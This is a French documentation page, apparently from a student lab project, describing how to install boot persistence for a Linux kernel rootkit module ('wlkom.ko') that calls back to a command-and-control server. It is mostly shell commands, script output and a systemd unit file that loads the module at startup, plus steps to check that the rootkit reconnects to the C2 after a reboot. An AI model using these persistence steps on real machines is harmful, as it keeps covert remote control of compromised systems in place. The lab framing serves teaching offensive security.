# Installer la persistance

La persistance fait en sorte que `wlkom.ko` se charge **automatiquement au démarrage** de la VM Victime, sans intervention manuelle. Après un `reboot`, le module est déjà actif et connecte au C2 dès que le réseau est disponible.

!!! note "Prérequis"
    Le module doit être compilé (`wlkom.ko` présent). Voir [Compiler le module](compile.md).

---

## Le script `install_persistence.sh`

Le script `rootkit/install_persistence.sh` automatise toute l'installation. Il fait les choses suivantes :

1. Demande le mot de passe en interactif (l'écho est désactivé, le mot de passe n'apparaît pas à l'écran)
2. Calcule le hash FNV-1a 32-bit du mot de passe
3. Copie `wlkom.ko` dans `/lib/modules/$(uname -r)/extra/`
4. Exécute `depmod -a` pour mettre à jour l'index des modules
5. Écrit `/etc/modprobe.d/wlkom.conf` avec les paramètres (`password_hash`, `c2_ip`, `c2_port`)
6. Crée `/etc/systemd/system/wlkom.service`
7. Active le service avec `systemctl enable`

---

## Installation

```bash
# Sur la VM Victime
cd /mnt/vmshare/rootkit
sudo ./install_persistence.sh 192.168.100.10 4444
```

Le script demande le mot de passe :

```
WLKOM password: 
```

Entrez votre mot de passe (exemple : `test`). Le script affiche :

```
[*] Password hash: afd071e5
[*] Installing wlkom.ko...
[*] Writing /etc/modprobe.d/wlkom.conf...
[*] Creating systemd service...
[*] Enabling wlkom.service...
[+] Done. Start with: sudo systemctl start wlkom.service
```

### Démarrer le service immédiatement

```bash
sudo systemctl start wlkom.service
sudo systemctl status wlkom.service
```

Sortie attendue :

```
● wlkom.service - WLKOM rootkit
     Loaded: loaded (/etc/systemd/system/wlkom.service; enabled; ...)
     Active: active (exited) since ...
```

---

## Tester la persistance après un reboot

**Sur la VM Attaquante** (avant de rebooter la victime) :

```bash
./c2 4444 test
```

**Sur la VM Victime** :

```bash
sudo reboot
```

Après le redémarrage, reconnectez-vous en SSH à la victime :

```bash
ssh -p 10022 epita@localhost
```

Vérifiez que le module est chargé :

```bash
lsmod | grep wlkom
sudo systemctl status wlkom.service
sudo dmesg | grep wlkom
```

Sur la fenêtre C2 (attaquante), vous devriez voir la reconnexion automatique :

```
[+] Rootkit connected from 192.168.100.20
```

---

## Ce que contient le service systemd

Le fichier `/etc/systemd/system/wlkom.service` créé par le script :

```ini
[Unit]
Description=WLKOM
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe wlkom
ExecStop=/sbin/modprobe -r wlkom
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
```

`After=network-online.target` est crucial : il garantit que l'interface `vmnet` est configurée avant que le module tente de contacter le C2. Sans ça, le module démarrerait trop tôt et ne trouverait pas le réseau.

`modprobe wlkom` (et non `insmod`) lit automatiquement les paramètres depuis `/etc/modprobe.d/wlkom.conf`, ce qui évite de les passer manuellement.

---

## Désactiver la persistance

```bash
sudo systemctl disable --now wlkom.service
sudo rm -f /etc/systemd/system/wlkom.service
sudo rm -f /etc/modprobe.d/wlkom.conf
sudo rm -f /lib/modules/$(uname -r)/extra/wlkom.ko
sudo depmod -a
```

---

## Vérification

- [x] `sudo systemctl status wlkom.service` → `active (exited)`
- [x] `lsmod | grep wlkom` → module présent
- [x] `dmesg | grep wlkom` → `wlkom: C2 authenticated`
- [x] Après `sudo reboot` + reconnexion SSH : le module est toujours là
- [x] Le C2 voit la reconnexion automatique
